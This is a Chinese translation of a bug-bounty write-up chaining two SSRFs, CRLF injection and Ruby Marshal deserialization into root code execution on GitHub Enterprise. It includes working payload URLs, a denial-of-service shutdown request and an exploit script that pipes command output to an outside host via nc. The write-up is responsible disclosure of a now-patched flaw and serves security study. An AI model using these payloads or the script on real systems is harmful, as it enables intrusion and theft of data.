> 原文链接: https://www.anquanke.com//post/id/86517 


# 【Blackhat】从SSRF执行链到RCE，看我如何利用GitHub企业版中的四个漏洞


                                阅读量   
                                **146005**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：blog.orange.tw
                                <br>原文地址：[http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01d0b41dae9e5406e0.png)](https://p0.ssl.qhimg.com/t01d0b41dae9e5406e0.png)



作者：[Orange Tsai ](http://blog.orange.tw/)  译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**写在前面的话**

****

在过去的几个月里，我一直都在认真准备2017年美国Black Hat黑客大会以及DEF CON 25的演讲内容，而成为一个Black Hat以及DEFCON的演讲者一直都是我人生中的一个非常重要的目标。除此之外，这也是我第一次在如此正式的场合下进行英文演讲，这绝对是一个值得回忆并且能够得瑟一辈子的事情！

在这篇文章中，我将会给大家简单介绍我的演讲内容。这里所使用的技术虽然不是什么新技术，但是这些旧的技术依然非常的强大。如果你对我的演讲感兴趣的话，可以点击**【**<a>**这里**</a>**】**获取幻灯片。

注：幻灯片中介绍了很多关于 SSRF(Server-Side Request Forgery:服务器端请求伪造) 的功能强大的新方法。

<br>

**直奔主题**

在这篇文章中，我将会告诉大家如何将四个漏洞串联起来并且最终在GitHub上实现了远程代码执行。值得一提的是，这份漏洞报告也荣获了GitHub第三届漏洞奖励周年评选中的<a>**最佳漏洞报告**</a>。

在我上一篇文章中，我提到了一个新的目标- GitHub Enterprise服务（GitHub企业版），并且我还介绍了如何反混淆GitHub的Ruby代码以及如何找出其中存在的SQL注入漏洞。在此之后，我发现有很多赏金猎人也开始将注意力转移到了GitHub Enterprise服务的身上，并且还找到了很多有意思的安全漏洞【[参考漏洞一](http://www.economyofmechanism.com/github-saml)】【[参考漏洞二](http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html)】。

看到了这些WriteUp之后，我就很烦躁了，为什么我当初就没发现这些漏洞呢？？因此，我自己暗下决心，我一定要找到一个高危漏洞!

<br>

**漏洞描述**

****

在我检查GitHub Enterprise服务的架构之前，我的直觉告诉我，GitHub Enterprise中还存在很多很多的内部服务。如果我可以利用这些内部服务的话，我相信我绝对可以找到很多有意思的东西。

接下来，所有的注意力我都会放在 SSRF(Server-Side Request Forgery:服务器端请求伪造) 漏洞的身上。

<br>

**第一个漏洞-无害的SSRF**

在寻找GitHub Enterprise漏洞的过程中，我发现了一个名叫WebHook的功能。这个功能非常有趣，当出现了特定的GIT命令时，它允许我们设置一个自定义的HTTP回调。

你可以使用下面给出的URL地址创建一个HTTP回调：

```
https://&lt;host&gt;/&lt;user&gt;/&lt;repo&gt;/settings/hooks/new
```

然后通过提交文件来触发回调。接下来，GitHub Enterprise将会通过一个HTTP请求来通知用户。下面给出的Payload和HTTP请求的样本：

Payload URL：

```
http://orange.tw/foo.php
```

回调请求：



```
POST /foo.php HTTP/1.1
Host: orange.tw
Accept: */*
User-Agent: GitHub-Hookshot/54651ac
X-GitHub-Event: ping
X-GitHub-Delivery: f4c41980-e17e-11e6-8a10-c8158631728f
content-type: application/x-www-form-urlencoded
Content-Length: 8972
payload=...
```

GitHub Enterprise使用了RubyGem faraday来获取外部资源，并防止用户通过Gem faraday-restrict-ip-addresses来请求内部服务。

在这里，Gem就像是一个黑名单一样，我们可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过这个黑名单。在Linux系统中，"0"代表的是"localhost"。PoC：

```
http://0/
```

非常好，现在我们已经拿到了一个SSRF漏洞了。但是，我们仍然什么都做不了，这是为什么呢？

因为这个SSRF有以下几种限制：

1. 只支持POST方法；

2. 只运行HTTP和HTTPS模式；

3. 没有302重定向；

4. faraday中没有CR-LF命令注入；

5. 无法控制POST数据和HTTP头；

我们唯一能够控制的就是其中的Path部分。但值得一提的是，这个SSRF漏洞可以导致拒绝服务攻击（DoS）。

在GitHub Enterprise中，端口9200绑定了一个弹性搜索服务，在后台使用关机命令的时候，该服务并不会关心其中的POST数据到底是什么内容。因此，我们就可以随意对它的REST-ful API进行操作了！

拒绝服务攻击PoC：

```
http://0:9200/_shutdown/
```



**第二个漏洞-内部Graphite中的SSRF**

****

我们已经拿到了一个SSRF漏洞，但这个漏洞限制那么多，想要直接利用它估计是很困难的，所以接下来我打算找找看是否还有其他的内部服务是可以被我们利用的。这可是一个大工程，因为在GitHub Enterprise中还有很多的HTTP服务，而每一个服务很可能都是采用不同的编程语言实现的，例如C/C++、Go、Python以及Ruby等等。在研究了好几天之后，我发现了一个名叫Graphite的服务，该服务绑定的端口号为8000。Graphite服务是一个高度可伸缩的实时图形系统，而GitHub需要使用这个系统来给用户显示某些图形化的统计数据。

Graphite采用Python语言开发，并且它本身也是一个开源项目，你可以点击**【**[**这里**](https://github.com/graphite-project/graphite-web)**】**获取Graphite项目的源代码。阅读了Graphite的源代码之后，我迅速地发现了另一个SSRF。第二个SSRF比较简单，这个漏洞存在于webapps/graphite/composer/views.py文件之中：

```
def send_email(request):
    try:
        recipients = request.GET['to'].split(',')
        url = request.GET['url']
        proto, server, path, query, frag = urlsplit(url)
        if query: path += '?' + query
        conn = HTTPConnection(server)
        conn.request('GET',path)
        resp = conn.getresponse()
        ...
```

你可以看到，**Graphite**会接受用户输入的**url**地址，然后直接进行资源请求！所以，我们就可以利用第一个SSRF漏洞来触发第二个SSRF漏洞，并将它们两个漏洞组合成一个SSRF执行链。

SSRF执行链Payload：



```
http://0:8000/composer/send_email?
to=orange@nogg&amp;
url=http://orange.tw:12345/foo
```

第二个SSRF的请求：



```
$ nc -vvlp 12345
...
 
GET /foo HTTP/1.1
Host: orange.tw:12345
Accept-Encoding: identity
```

现在我们已经成功地将这个基于POST的SSRF改成了基于GET的SSRF了。但是，我们还是没办法利用这个漏洞去做任何事情。所以我们还得继续努力…

<br>

**第三个漏洞-Python中的CRLF注入**

你可以从Graphite的源码中看到，Graphite使用了Python的httplib.HTTPConnection来获取资源。在进行了一番研究之后，我发现在httplib.HTTPConnection竟然存在一个CR-LF命令注入漏洞。因此，我们就可以在HTTP协议中嵌入恶意的Payload了。

CR-LF注入PoC：



```
http://0:8000/composer/send_email?
to=orange@nogg&amp;
url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo:
 
$ nc -vvlp 12345
...
 
GET /
i_am_payload
Foo: HTTP/1.1
Host: 127.0.0.1:12345
Accept-Encoding: identity
```

虽然这看起来我们貌似只前进了一小步，但对于整个漏洞利用链来说却是非常大的进步。现在，我已经可以在这个SSRF漏洞执行链中引入其他的协议了。比如说，如果我想对其中的Redis动手，我们就可以尝试使用下列Payload：



```
http://0:8000/composer/send_email?
to=orange@nogg&amp;
url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A
```

注:Redis的slaveof命令可以允许我们使用带外数据，当你用户到某些Blind-SSRF时这种技巧是非常实用的。

不过，在可利用的协议方面还是存在有很多的限制：

1.像SSH、MySQL和SSL这种需要进行握手的协议将会失效；

2.由于Python2的原因，我们在第二个SSRF中所使用的Payload只允许0x00到0x8F字节的数据。

顺便提一下，我们还有很多利用HTTP协议的方法。在我的演讲幻灯片中，我还演示了如何使用Linux Glibc来修改SSL协议。除此之外，你也可以参考漏洞CVE-2016-5699！如果你感兴趣的话…

<br>

**第四个漏洞-不安全的反序列化**

目前为止，我们已经能够在HTTP协议中利用其他的协议或嵌入Payload了，但是接下来的问题就是，我应该选择哪一个协议呢？如果我能够控制Redis或Memcached的话，我能够触发哪一个漏洞呢？

我花了很多时间来弄清楚上面这些问题，在检查相关源代码的过程中，我比较想知道GitHub为什么会在Memcached中存储Ruby对象。在研究了一阵子之后，我发现GitHub Enterprise使用RubyGem mecached来处理缓存，而缓存的封装是通过Marshal实现的。这就非常棒了，因为所有人都知道Marshal是非常危险的，所以我们接下来的目标就非常清晰了。

我准备使用之前的SSRF漏洞执行链在Memcached中存储恶意Ruby对象。当GitHub下一次获取缓存时，RubyGem memcached将会自动对数据进行反序列化操作，而结果就是…要爆炸！！因为我们在GitHub上实现了远程代码执行（RCE）。

Rails控制台中不安全的Marshal：



```
irb(main):001:0&gt; GitHub.cache.class.superclass
=&gt; Memcached::Rails
irb(main):002:0&gt; GitHub.cache.set("nogg", "hihihi")
=&gt; true
irb(main):003:0&gt; GitHub.cache.get("nogg")
=&gt; "hihihi"
irb(main):004:0&gt; GitHub.cache.get("nogg", :raw=&gt;true)
=&gt; "x04bI"vhihihix06:x06ET"
irb(main):005:0&gt; code = "`id`"
=&gt; "`id`"
irb(main):006:0&gt; payload = "x04x08" + "o"+":x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"x07" + ":x0E@instance" + "o"+":x08ERB"+"x07" + ":x09@src" + Marshal.dump(code)[2..-1] + ":x0c@lineno"+ "ix00" + ":x0C@method"+":x0Bresult"
=&gt;
"u0004bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxya:u000E@instanceo:bERBa:t@srcI"t`id`u0006:u0006ET:f@linenoiu0000:f@method:vresult"
irb(main):007:0&gt; GitHub.cache.set("nogg", payload, 60, :raw=&gt;true)
=&gt; true
irb(main):008:0&gt; GitHub.cache.get("nogg")
=&gt; "uid=0(root) gid=0(root) groups=0(root)n"
```

没错，就是这样。现在我们重新梳理一下整个过程：

1.第一个SSRF漏洞，可以绕过WebHook中现有的保护机制。

2.第二个SSRF漏洞，存在于Graphite服务之中。

3.结合第一个和第二个SSRF漏洞，组成SSRF漏洞执行链。

4.SSRF执行链中的CR-LF注入。

5.利用Memcached协议，注入恶意Marshal对象。

6.触发远程代码执行。

[![](https://p4.ssl.qhimg.com/t01385c4a3784c3aaaf.png)](https://p4.ssl.qhimg.com/t01385c4a3784c3aaaf.png)



**漏洞利用代码**

```
#!/usr/bin/python
 from urllib import quote
   ''' set up the marshal payload from IRB
 code = "`id | nc orange.tw 12345`"
 p "x04x08" + "o"+":x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"x07" + ":x0E@instance" + "o"+":x08ERB"+"x07" + ":x09@src" + Marshal.dump(code)[2..-1] + ":x0c@lineno"+ "ix00" + ":x0C@method"+":x0Bresult"
 '''
 marshal_code = 'x04x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxyx07:x0e@instanceo:x08ERBx07:t@srcI"x1e`id | nc orange.tw 12345`x06:x06ET:x0c@linenoix00:x0c@method:x0bresult'
   payload = [
 '',
 'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
 marshal_code,
 '',
 ''
 ]
   payload = map(quote, payload)
 url = 'http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/'
   print "nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by orange@chroot.org"
 print '-'*10 + 'n'
 print url + '%0D%0A'.join(payload)
 print '''
 Inserting WebHooks from:
 https://ghe-server/:user/:repo/settings/hooks
   Triggering RCE from:
 https://ghe-server/search?q=ggggg&amp;type=Repositories
 '''
```



**漏洞修复**

GitHub采取了以下措施来防止相关问题再次发生，并提升了网站安全性：

1.增强了Gem faraday-restrict-ip-addresses；

2.采用了自定义的Django中间件来确保攻击者无法从外部访问http://127.0.0.1:8000/render/；

3.增强了iptables规则；



```
$ cat /etc/ufw/before.rules
...
-A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp-flags PSH,ACK PSH,ACK --remove -m string --algo bm --string "User-Agent: GitHub-Hookshot" -j REJECT --reject-with tcp-reset
...
```



**时间轴**

2017年01月23日23:22：通过HackerOne将漏洞上报给GitHub，报告编号为200542；

2017年01月23日23:37：GitHub将报告状态修改为已分类；

2017年01月24日04:43：GitHub确认了漏洞，并表示正在修复相关问题；

2017年01月31日14:01：GitHub Enterprise 2.8.7发布；

2017年02月01日01:02：GitHub回复称漏洞已成功修复；

2017年02月01日01:02：GitHub提供了7500美刀的漏洞奖金；

2017年03月15日02:38：GitHub又提供了5000美金的年度最佳漏洞报告奖励；
